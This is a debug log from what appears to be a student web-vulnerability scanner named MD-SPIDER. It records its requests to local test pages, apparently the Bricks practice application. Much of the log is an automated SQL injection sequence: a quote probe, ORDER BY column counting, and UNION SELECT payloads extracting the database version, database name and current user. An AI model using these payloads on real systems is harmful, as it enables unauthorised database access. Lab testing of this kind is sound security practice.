INFO [2022-05-26 09:46:38,786] root 184317 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-27 22:16:42,740] urllib3.connectionpool 309878 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /kizolastore/pub/cadastrar HTTP/1.1" 200 None]
INFO [2022-05-27 22:20:00,887] root 310271 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-27 22:20:01,215] urllib3.connectionpool 310271 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-27 22:20:01,271] urllib3.connectionpool 310271 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /kizolastore/pub/cadastrar HTTP/1.1" 200 None]
DEBUG [2022-05-27 22:20:01,276] urllib3.connectionpool 310271 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-27 22:20:01,309] urllib3.connectionpool 310271 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /kizolastore/pub/cadastrar HTTP/1.1" 200 None]
DEBUG [2022-05-27 22:20:01,315] urllib3.connectionpool 310271 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-27 22:20:01,347] urllib3.connectionpool 310271 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /kizolastore/pub/cadastrar HTTP/1.1" 200 None]
INFO [2022-05-27 22:24:23,634] root 310682 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-27 22:24:24,031] urllib3.connectionpool 310682 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-27 22:24:24,077] urllib3.connectionpool 310682 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /kizolastore/pub/cadastrar HTTP/1.1" 200 None]
DEBUG [2022-05-27 22:24:24,080] urllib3.connectionpool 310682 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-27 22:24:24,125] urllib3.connectionpool 310682 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /kizolastore/pub/cadastrar HTTP/1.1" 200 None]
DEBUG [2022-05-27 22:24:24,129] urllib3.connectionpool 310682 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-27 22:24:24,177] urllib3.connectionpool 310682 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /kizolastore/pub/cadastrar HTTP/1.1" 200 None]
INFO [2022-05-28 04:21:03,847] root 370731 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-28 04:21:05,252] urllib3.connectionpool 370731 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:21:06,047] urllib3.connectionpool 370731 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /kizolastore/pub/cadastrar HTTP/1.1" 200 None]
DEBUG [2022-05-28 04:21:06,090] urllib3.connectionpool 370731 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:21:06,134] urllib3.connectionpool 370731 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /kizolastore/pub/cadastrar HTTP/1.1" 200 None]
DEBUG [2022-05-28 04:21:06,140] urllib3.connectionpool 370731 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:21:06,166] urllib3.connectionpool 370731 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /kizolastore/pub/cadastrar HTTP/1.1" 200 None]
INFO [2022-05-28 04:36:39,542] root 371416 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
INFO [2022-05-28 04:37:15,969] root 371494 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
INFO [2022-05-28 04:37:57,959] root 371573 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-28 04:37:58,296] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,593] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 04:37:58,597] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,602] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 04:37:58,607] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,718] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "HEAD /bricks/content-1/index.php?id=0' HTTP/1.1" 200 0]
DEBUG [2022-05-28 04:37:58,721] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,724] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "POST /bricks/content-1/index.php?id=0' HTTP/1.1" 200 1713]
DEBUG [2022-05-28 04:37:58,727] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,730] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+1 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 04:37:58,734] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,738] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+2 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 04:37:58,742] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,746] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+3 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 04:37:58,752] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,757] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+4 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 04:37:58,760] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,763] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+5 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 04:37:58,767] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,771] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+6 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 04:37:58,773] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,776] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+7 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 04:37:58,778] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,782] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+8 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 04:37:58,785] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,787] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+9 HTTP/1.1" 200 1713]
DEBUG [2022-05-28 04:37:58,791] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,852] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+version(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 04:37:58,857] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,861] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20version(),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 04:37:58,866] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,870] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20version(),%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 04:37:58,874] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,879] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20version(),%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 04:37:58,883] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,888] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20version(),%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 04:37:58,893] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,896] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20version(),%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 04:37:58,901] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,906] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20version(),%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 04:37:58,911] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,915] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20version() HTTP/1.1" 200 3226]
DEBUG [2022-05-28 04:37:58,921] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,943] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+database(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3227]
DEBUG [2022-05-28 04:37:58,957] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,972] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+(SELECT+CURRENT_USER),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 04:37:58,982] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,986] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20(SELECT+CURRENT_USER),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 04:37:58,995] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:58,999] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20(SELECT+CURRENT_USER),%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 04:37:59,010] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:59,015] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20(SELECT+CURRENT_USER),%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 04:37:59,024] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:59,028] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20(SELECT+CURRENT_USER),%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 04:37:59,038] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:59,042] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20(SELECT+CURRENT_USER),%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 04:37:59,052] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:59,056] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20(SELECT+CURRENT_USER),%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 04:37:59,065] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:37:59,069] urllib3.connectionpool 371573 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20(SELECT+CURRENT_USER) HTTP/1.1" 200 3238]
INFO [2022-05-28 04:46:23,950] root 372480 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-28 04:46:24,292] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:46:24,338] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 04:46:24,341] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:46:24,344] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 04:46:24,347] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:46:24,350] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "HEAD /bricks/content-1/index.php?id=0' HTTP/1.1" 200 0]
DEBUG [2022-05-28 04:46:24,353] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:46:24,357] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "POST /bricks/content-1/index.php?id=0' HTTP/1.1" 200 1713]
DEBUG [2022-05-28 04:46:24,361] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:46:24,363] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+1 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 04:46:24,367] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:46:24,371] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+2 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 04:46:24,374] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 04:46:24,377] urllib3.connectionpool 372480 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+3 HTTP/1.1" 200 3193]
